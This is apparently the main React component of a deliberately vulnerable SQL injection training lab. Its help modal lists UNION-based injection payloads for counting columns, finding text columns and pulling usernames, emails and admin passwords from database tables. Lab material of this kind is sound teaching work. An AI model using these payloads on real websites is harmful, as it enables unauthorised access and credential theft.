import React from 'react';
import { BrowserRouter as Router, Routes, Route } from 'react-router-dom';
import Home from './Home';
import ArticleDetail from './ArticleDetail';
import './App.css';

function App() {
  return (
    <Router>
      <div className="app-container">
        <nav className="navbar navbar-expand-lg navbar-dark bg-primary">
          <div className="container">
            <a className="navbar-brand" href="/">SQL Injection Lab: Finding Text Columns</a>
            <button className="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
              <span className="navbar-toggler-icon"></span>
            </button>
            <div className="collapse navbar-collapse" id="navbarNav">
              <ul className="navbar-nav ms-auto">
                <li className="nav-item">
                  <a className="nav-link" href="/" data-bs-toggle="modal" data-bs-target="#helpModal">
                    Help
                  </a>
                </li>
              </ul>
            </div>
          </div>
        </nav>
        
        {/* Help Modal */}
        <div className="modal fade" id="helpModal" tabIndex="-1">
          <div className="modal-dialog modal-lg">
            <div className="modal-content">
              <div className="modal-header">
                <h5 className="modal-title">SQL Injection Text Column Lab</h5>
                <button type="button" className="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
              </div>
              <div className="modal-body">
                <h4>Your objective:</h4>
                <ol>
                  <li>Determine which columns can accept text data</li>
                  <li>Extract data from users table using text-compatible columns</li>
                  <li>Extract admin credentials in visible positions</li>
                </ol>
                
                <h4>Step 1: Find column count</h4>
                <p>Use ORDER BY to determine columns:</p>
                <ul>
                  <li><code>?category=tech' ORDER BY 5--</code> (should work)</li>
                  <li><code>?category=tech' ORDER BY 6--</code> (should fail)</li>
                </ul>
                
                <h4>Step 2: Test each column for text compatibility</h4>
                <ul>
                  <li><code>?category=tech' UNION SELECT 'TEST',NULL,NULL,NULL,NULL--</code></li>
                  <li><code>?category=tech' UNION SELECT NULL,'TEST',NULL,NULL,NULL--</code></li>
                  <li><code>?category=tech' UNION SELECT NULL,NULL,'TEST',NULL,NULL--</code></li>
                  <li><code>?category=tech' UNION SELECT NULL,NULL,NULL,'TEST',NULL--</code></li>
                  <li><code>?category=tech' UNION SELECT NULL,NULL,NULL,NULL,'TEST'--</code></li>
                </ul>
                
                <h4>Step 3: Extract data using text columns</h4>
                <ul>
                  <li><code>?category=tech' UNION SELECT NULL,username,email,NULL,NULL FROM users--</code></li>
                  <li><code>?category=tech' UNION SELECT NULL,admin_username,admin_password,NULL,role FROM admin_users--</code></li>
                </ul>
                
                <div className="alert alert-warning">
                  This is a purposely vulnerable application for educational purposes. Never apply these techniques on real websites without permission!
                </div>
              </div>
              <div className="modal-footer">
                <button type="button" className="btn btn-secondary" data-bs-dismiss="modal">Close</button>
              </div>
            </div>
          </div>
        </div>
        
        <div className="container py-4">
          <Routes>
            <Route path="/" element={<Home />} />
            <Route path="/article/:id" element={<ArticleDetail />} />
          </Routes>
        </div>
      </div>
    </Router>
  );
}

export default App;